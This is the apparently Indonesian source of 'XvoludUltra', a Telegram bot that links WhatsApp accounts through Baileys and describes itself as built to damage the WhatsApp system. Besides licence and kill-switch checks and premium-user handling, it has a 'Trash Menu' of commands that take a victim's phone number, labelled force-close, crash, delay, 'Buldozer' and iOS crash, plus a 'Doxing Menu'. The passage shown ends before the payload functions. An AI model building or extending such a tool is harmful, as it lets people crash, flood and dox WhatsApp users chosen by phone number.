const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessage,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const FormData = require("form-data");
const path = require("path");
const { GoogleGenAI } = require("@google/genai");
const sessions = new Map();
const { exec } = require("child_process")
const https = require("https")
const sharp = require("sharp");
const cd = "./cooldown.json";
const vm = require('vm');
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./config.js");
const { v4, uuidv4 } = require("uuid")
const { pipeline } = require("stream")
const { promisify } = require("util")
const streamPipeline = promisify(pipeline)
const { OpenAI } = require("openai");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const blacklist = ["8461214077", "8434073344", "8154399997"]; // tambahin aja jngn hapus
    
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
// ~ Thumbnail
const imageThumbnail = "https://gangalink.vercel.app/i/9uwlarki.mp4";

// ~ Database Url
const databaseURL = "https://github.com/adlimubarokff-cmyk/Kentatele.git";

let tokensRegistered = false;
async function isTokenRegistered(token) {
    try {
        const response = await axios.get(databaseURL);
        const tokenData = response.data;

        if (!tokenData.tokens.includes(token)) {
            console.log(chalk.red(`
      ⠀⠀⠀⢀⡠⠄⠒⠈⠉⠉⠁⠀⠉⠉⠁⠒⠠⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⠂⠁⠀⠀⢀⡀⠤⠄⠀⠀⠠⠤⢄⡀⠀⠀⠈⠑⢤⡀⠀⠀⠀⠀
⠀⠀⠀⡠⠊⠀⠀⢠⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⢄⠀⠀⠈⢦⠀⠀⠀
⠀⢀⠌⠀⠀⣀⠀⠀⠙⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠱⡀⠀
⠀⠎⠀⠀⡰⠁⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠐⡀
⠸⠀⠀⠰⠁⠀⠀⠀⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⢡
⡇⠀⠀⠇⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀
⡇⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⢀⠀⠀⢠
⢱⠀⠀⠱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⡜⠀⠀⡘
⠀⢆⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢦⡀⡜⠀⠀⢠⠁
⠀⠈⢧⡀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠉⠀⠀⡰⠃⠀
⠀⠀⠀⠑⣄⠀⠀⠑⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠃⠀⠀⢀⠜⠁⠀⠀
⠀⠀⠀⠀⠈⠓⢄⡀⠀⠀⠉⠐⠒⠀⠀⠀⠀⠐⠂⠉⠀⠀⠀⡠⠔⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠐⠢⠄⣀⣀⣀⠀⠀⢀⣀⣀⠠⠄⢂⠁⠀⠀⠀⠀⠀⠀⠀
XVOLUDULTRA VERSION 20\n❌ ⵢ Your Bot Token Is Not Registered\n— Please Contact The Owner\n— @XcovzOfficial ( Telegram )`));
            process.exit(1); // Keluar dari script
            tokensRegistered = false;
        } else {
            console.log(chalk.magenta(`
      ⠀⠀⢀⣴⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⡄⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⠀
⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣧⣦⡀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠈⠻⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⡿⠻⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⢀⣴⣽⣾⢿⣿⣿⣿⣿⣿
⢈⣿⣿⣿⣿⣿⣿⣯⡀⠀⠈⠻⣿⣿⣿⠟⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠈⠛⠁⠀⢀⢐⣿⣿⣿⣾⢿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⢀⣴⣯⣿⣿⣿⣿⣿⣾⣽⣿⣿⣿⣿⣿⣿
⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣿⣿⣿⣾⣿⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⠟⠛⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⠿⢿⡻⠿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀\n\n • Bot Name : XvoludUltra PRO\n • Version : 18\n • Developer : XcovzOfficial\n • telegram : t.me/XcovzOfficial\n • YouTube : @XcovzOfficial`));
        }
        tokensRegistered = true;
    } catch (error) {
        console.error("❌ ⵢ Gagal mengambil data token:", error.message);
        process.exit(1);
    }
}


isTokenRegistered(BOT_TOKEN);

const switchUrl = 'https://raw_swicth_lu';
async function checkSecurityAndStart() {
    try {
        // --- Cek Status Kill Switch --- \\
        const { data: switchData } = await axios.get(switchUrl, { timeout: 5000 });
        
        if (switchData.status === 'block') {
            const message = switchData.message || 'Lisensi telah dicabut.';
            
            console.error(chalk.red('[ ❌ ] ⵢ Akses Ditolak : Bot telah dihentikan!'));
            console.error(chalk.white(`From Devoloper : ${message}`));
            process.exit(1); 
        }

        return true; 

    } catch (e) {
        console.error(chalk.yellow('⚠️ ⵢ Gagal memverifikasi status dari GitHub. Menghentikan bot untuk keamanan.'), e.message);
        
        process.exit(1);
    }
}

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./Dàtabase/premium.json');
ensureFileExists('./Dàtabase/admin.json');

let premiumUsers = JSON.parse(fs.readFileSync('./Dàtabase/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./Dàtabase/admin.json'));

function savePremiumUsers() {
    fs.writeFileSync('./Dàtabase/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./Dàtabase/admin.json', JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./Dàtabase/premium.json', (data) => (premiumUsers = data));
watchFile('./Dàtabase/admin.json', (data) => (adminUsers = data));

const userIDS = './Dàtabase/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(userIDS, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}


function saveUserIds(userIds) {
    try {
        fs.writeFileSync(userIDS, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`User ${userId} Has Been Added.`);
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

let isWhatsAppConnected = false;
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage

  async function sendStatus(caption) {
    if (statusMessage) {
      try {
        await bot.deleteMessage(chatId, statusMessage)
      } catch {}
    }
    statusMessage = await bot.sendPhoto(
      chatId,
      imageThumbnail,
      { caption, parse_mode: "HTML" }
    ).then(msg => msg.message_id)
  }

  await sendStatus(
    `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡. Number : ${botNumber}
│╰┈➤ Status : Process
╰───────────────⊱
`
  )

  const sessionDir = createSessionDir(botNumber)
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir)

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined
  })

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update

    if (connection === "close") {
      isWhatsAppConnected = false
      const statusCode = lastDisconnect?.error?.output?.statusCode

      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await sendStatus(
          `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡. Number : ${botNumber}
│╰┈➤ Status : Not Connected
╰───────────────⊱
`
        )
        await ConnectToWhatsApp(botNumber, chatId)
      } else {
        await sendStatus(
          `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡. Number : ${botNumber}
│╰┈➤ Status : Gagal ❌
╰───────────────⊱
`
        )
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true })
        } catch {}
      }
    }

    if (connection === "open") {
      isWhatsAppConnected = true
      sessions.set(botNumber, sock)
      saveActiveSessions(botNumber)

      await sendStatus(
        `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡. Number : ${botNumber}
│╰┈➤ Status : Connected 
╰───────────────⊱
`
      )
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000))
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          let customcode = "DANZOFFC"
          const code = await sock.requestPairingCode(botNumber, customcode)
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code

          await sendStatus(
            `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡. Number : ${botNumber}
│╰┈➤ Code Pairing :
<b>${formattedCode}</b>
╰───────────────⊱
`
          )
        }
      } catch (error) {
        isWhatsAppConnected = false
        await sendStatus(
          `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡. Number : ${botNumber}
│╰┈➤ Error ❌ ${error.message}
╰───────────────⊱
`
        )
      }
    }
  })

  sock.ev.on("creds.update", saveCreds)
  return sock
}

// ~ Fungsional Function Before Parameters
function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Cooldown
const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cd)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return ` Cooldown has been set to ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium ! - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}
 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

let users = [];
if (fs.existsSync("users.json")) {
  try {
    users = JSON.parse(fs.readFileSync("users.json"));
  } catch (err) {
    console.error("Gagal membaca users.json:", err);
    users = [];
  }
} else {
  fs.writeFileSync("users.json", JSON.stringify([]));
}

function getRandomImage() {

  const images = [

    "https://files.catbox.moe/n27oqg.jpg",

  ];

  return images[Math.floor(Math.random() * images.length)];

}
const bugRequests = {};
const userButtonColor = {}
const buttonIntervals = new Map()

async function sendStartMenu(chatId, from) {

  const userId = from.id
  const randomImage = getRandomImage()
  
  const runtimeStatus = formatRuntime()
  const memoryStatus = formatMemory()

  const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
  const botNumber = sessions.size

  const chosenColor = userButtonColor[userId] || "primary"

  let styles

  if (chosenColor === "disco") {
    styles = ["primary","success","danger"]
  }

  else {

    const safeColor = {
      danger: "danger",
      success: "success",
      secondary: "primary" 
    }

    styles = [ safeColor[chosenColor] || "primary" ]
  }

  let index = 0

  let keyboard = [
    [
{
    text: " ( ☩ ) Tools V1",
    callback_data: "toolscoy",
    style: styles[index],
    icon_custom_emoji_id: "6219549292458150316"
  },
  {
    text: " ( ☩ ) Tools V2",
    callback_data: "tools_v2",
    style: styles[index]
  },
  {
    text: " ( ☩ ) Tools V3     ",
    callback_data: "tools_v3",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Trash Menu",
    callback_data: "trashshow",
    style: styles[index]
  },
  {
    text: " ( ☩ )  Xsettings",
    callback_data: "settings",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Doxing Menu",
    callback_data: "doxingmenu",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Credits",
   callback_data: "thanksto",
    style: styles[index]
  }, 
  {
  text: "( ☩ ) About",
  url: "https://t.me/XcovzXvolud",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
    ]
  ]

  if (chosenColor === "disco") {

    keyboard = [
      [
{
    text: " ( ☩ ) Tools V1",
    callback_data: "toolscoy",
    style: styles[index],
    icon_custom_emoji_id: "6219549292458150316"
  },
  {
    text: " ( ☩ ) Tools V2",
    callback_data: "tools_v2",
    style: styles[index]
  },
  {
    text: " ( ☩ ) Tools V3     ",
    callback_data: "tools_v3",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Trash Menu",
    callback_data: "trashshow",
    style: styles[index]
  },
  {
    text: " ( ☩ )  Xsettings",
    callback_data: "settings",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Doxing Menu",
    callback_data: "doxingmenu",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Credits",
   callback_data: "thanksto",
    style: styles[index]
  }, 
  {
  text: "( ☩ ) About",
  url: "https://t.me/XcovzXvolud",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
      }
    ]
    ]
   }
  const sent = await bot.sendVideo(chatId, imageThumbnail, {

    message_effect_id: "5104841245755180586",

    caption: `
<blockquote><strong> <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji>𝐗𝐕𝐎𝐋𝐔𝐃 - 𝐔𝐋𝐓𝐑𝐀<tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
( 🐸 ) Olaa 
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 
➤「 𝐒𝐓𝐀𝐓𝐔𝐒 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<b>⬡ Sender Statueˋs : ${status}</b>
<b>⬡ Memory Panel : ${memoryStatus}</b>
<b>⬡ Runtime Panel : ${runtimeStatus}</b>
<b>⬡ Sender Script : ${botNumber}</b>
`,
    parse_mode: "HTML",

    reply_markup: {
      inline_keyboard: keyboard
    }

  })

  const messageId = sent.message_id

  if (styles.length > 1) {

    const intervalId = setInterval(async () => {

      index++
      if (index >= styles.length) index = 0

      let newKeyboard

      if (chosenColor === "disco") {

        newKeyboard = [
          [
{
    text: " ( ☩ ) Tools V1",
    callback_data: "toolscoy",
    style: styles[index],
    icon_custom_emoji_id: "6219549292458150316"
  },
  {
    text: " ( ☩ ) Tools V2",
    callback_data: "tools_v2",
    style: styles[index]
  },
  {
    text: " ( ☩ ) Tools V3     ",
    callback_data: "tools_v3",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Trash Menu",
    callback_data: "trashshow",
    style: styles[index]
  },
  {
    text: " ( ☩ )  Xsettings",
    callback_data: "settings",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Doxing Menu",
    callback_data: "doxingmenu",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Credits",
   callback_data: "thanksto",
    style: styles[index]
  }, 
  {
  text: "( ☩ ) About",
  url: "https://t.me/XcovzXvolud",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
          ]
        ]

      } else {

        newKeyboard = [
         [
{
    text: " ( ☩ ) Tools V1",
    callback_data: "toolscoy",
    style: styles[index],
    icon_custom_emoji_id: "6219549292458150316"
  },
  {
    text: " ( ☩ ) Tools V2",
    callback_data: "tools_v2",
    style: styles[index]
  },
  {
    text: " ( ☩ ) Tools V3     ",
    callback_data: "tools_v3",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Trash Menu",
    callback_data: "trashshow",
    style: styles[index]
  },
  {
    text: " ( ☩ )  Xsettings",
    callback_data: "settings",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Doxing Menu",
    callback_data: "doxingmenu",
    style: styles[index]
  }
],
[
  {
    text: " ( ☩ ) Credits",
   callback_data: "thanksto",
    style: styles[index]
  }, 
  {
  text: "( ☩ ) About",
  url: "https://t.me/XcovzXvolud",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
        ]
     ]
     }
      try {

        await bot.editMessageReplyMarkup(
          { inline_keyboard: newKeyboard },
          {
            chat_id: chatId,
            message_id: messageId
          }
        )

      } catch (e) {}

    }, 2000)

    buttonIntervals.set(messageId, intervalId)

  }

}

function isPremium(userId) {

const user = premiumUsers.find(u => u.id === userId)
if (!user) return false

if (user.expiresAt === "permanent") return true

return Date.now() < user.expiresAt

}

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  if (!users.includes(chatId)) {
    users.push(chatId);
    fs.writeFileSync("users.json", JSON.stringify(users, null, 2));
  }
});

bot.onText(/^\/start(?:\s+(.+))?/, async (msg, match) => {
  const isAllowed = await checkSecurityAndStart();
  
   if (isAllowed) {
    }
   if (!tokensRegistered) {
    return bot.sendMessage(msg.chat.id, "❌ ⵢ Token Anda Tidak Terdaftar !!");
    process.exit(1);
  }
   if (blacklist.includes(msg.chat.id)) {
        return bot.sendMessage(msg.chat.id, "❌ ⵢ Anda Telah Masuk Dalam List Blacklist.");
    }
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const memory = formatMemory();
  const senderStatus = isWhatsAppConnected ? "Connected" : "Disconnect";
  const cooldown = checkCooldown(senderId);

  await bot.sendPhoto(
  chatId,
  "https://files.catbox.moe/n27oqg.jpg",
  {
    caption: `
<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━
( 👁️ ) Holla 
Selamat datang di script XvoludUltra

saya adalah script bot telegram yang di ciptakan oleh XcovzOfficial yang di rancang untuk merusak system whatsapp

 Owner : @XcovzOfficial

 Developer : @HanzxOfficial55

 Asisten : @ZyezaOfficial</b></blockquote>

<blockquote>pilih variasi warna di bawah ini</blockquote>
`,
    parse_mode:"HTML",
    reply_markup:{
      inline_keyboard:[
        [
          { text:"🔴 Merah", callback_data:"color_danger" }
        ], 
        [
          { text:"🟢 Hijau", callback_data:"color_success" }, 
          { text:"🔵 Biru", callback_data:"color_secondary" }
        ], 
        [
          { text:"💥 Disko", callback_data:"color_disco" }
         ]

      ]

    }

  });

  const audioPath = path.join(__dirname, "./Lagu.mp3");

  await bot.sendAudio(chatId, audioPath, {

    caption: "Musik",

    performer: "XvoludUltra"

  });
  });


bot.on("callback_query", async (query) => {
  try {
    if (!query.message) return
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
      const data = query.data;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const memory = formatMemory();
    const senderStatus = isWhatsAppConnected ? "Connected" : "Disconnect";
    const cooldown = checkCooldown(senderId);
    const premiumStatus = getPremiumStatus(query.from.id);
    
  if (buttonIntervals.has(messageId)) {

    clearInterval(buttonIntervals.get(messageId))
    buttonIntervals.delete(messageId)

  }
if (query.data.startsWith("color_")) {

    const color = data.replace("color_","")

    userButtonColor[senderId] = color

    await bot.answerCallbackQuery(query.id,{
      text:"🎨 Warna dipilih"
    })

    await bot.deleteMessage(chatId,messageId).catch(()=>{})

    await sendStartMenu(chatId, query.from)

    return
}


    await bot.deleteMessage(chatId,messageId).catch(()=>{})     
    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashshow") {
      caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
— ( 🐸 ) Olaa ${username}
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 

╭───⊱<b>「 Trash Menu 」</b>
│⬡ /MentalHama « Number »
│╰┈➤ Force Invisible Hard
│⬡ /MentalBuaya « Number »
│╰┈➤ Crash Invisible Hard
│⬡ /Yanto « Number »
│╰┈➤ Delay Invisible Hard
│⬡ /Yanti « Number »
│╰┈➤ Buldozer 10gb
│⬡ /MakLoe « Number »
│╰┈➤ Blank Hard
│⬡ /Hama « Number »
│╰┈➤ Crash Ios
╰───────────────⊱

<b>XVOLUDULTRA VERSION 20</b>
`;
